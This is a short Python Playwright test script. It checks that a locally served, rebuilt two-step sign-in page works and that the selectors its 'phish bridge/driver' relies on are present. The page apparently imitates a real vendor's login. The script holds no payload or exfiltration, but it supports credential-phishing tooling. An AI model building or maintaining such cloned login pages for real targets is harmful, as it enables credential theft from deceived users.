#!/usr/bin/env python3
"""Verify the rebuilt signin page: one input -> Continue -> password step, and that the
phish bridge/driver selectors are all present."""
from playwright.sync_api import sync_playwright

BASE = 'http://127.0.0.1:8099'

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)
    ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    page = ctx.new_page()
    page.goto(BASE + '/signin.html', wait_until='networkidle', timeout=30000)
    page.wait_for_timeout(400)

    # --- structure: step 1 ---
    acc_visible = page.locator('#account').is_visible()
    pw_visible = page.locator('#password').is_visible()
    step_pw_hidden = page.evaluate("() => document.getElementById('step-password').hidden")
    btn_label = page.locator('#continue-label').inner_text()
    print('STEP1: account visible=', acc_visible, '| password visible=', pw_visible,
          '| step-password hidden=', step_pw_hidden, '| button label=', repr(btn_label))

    # --- drive to step 2 ---
    page.fill('#account', 'test@example.com')
    page.wait_for_timeout(150)
    btn_enabled = page.locator('#continue-btn').is_enabled()
    page.click('#continue-btn')
    page.wait_for_timeout(900)

    step_pw_hidden2 = page.evaluate("() => document.getElementById('step-password').hidden")
    pw_visible2 = page.locator('#password').is_visible()
    btn_label2 = page.locator('#continue-label').inner_text()
    acc_stacked = page.evaluate(
        "() => { var s=document.getElementById('account-slot-stacked'); "
        "return s ? s.contains(document.getElementById('account-field')) : false; }")
    print('STEP2: step-password hidden=', step_pw_hidden2, '| password visible=', pw_visible2,
          '| button label=', repr(btn_label2), '| account stacked into slot=', acc_stacked)

    # --- phish bridge/driver selectors present? ---
    ids = ['sign-in', 'account', 'password', 'step-initial', 'step-password', 'account-field',
           'password-field', 'account-slot-stacked', 'iphone-signin-col', 'form-actions',
           'continue-btn', 'continue-label', 'form-note']
    missing = [i for i in ids if page.evaluate("(id) => !document.getElementById(id)", i)]
    form_ok = page.evaluate("() => { var f=document.getElementById('sign-in'); "
                            "return f && f.classList.contains('auth-widget'); }")
    panel_ok = page.evaluate("() => Boolean(document.querySelector('.signin .panel.parent-container'))")
    print('form#sign-in has auth-widget=', form_ok, '| .signin .panel.parent-container=', panel_ok)
    print('missing ids:', missing if missing else 'none')

    b.close()
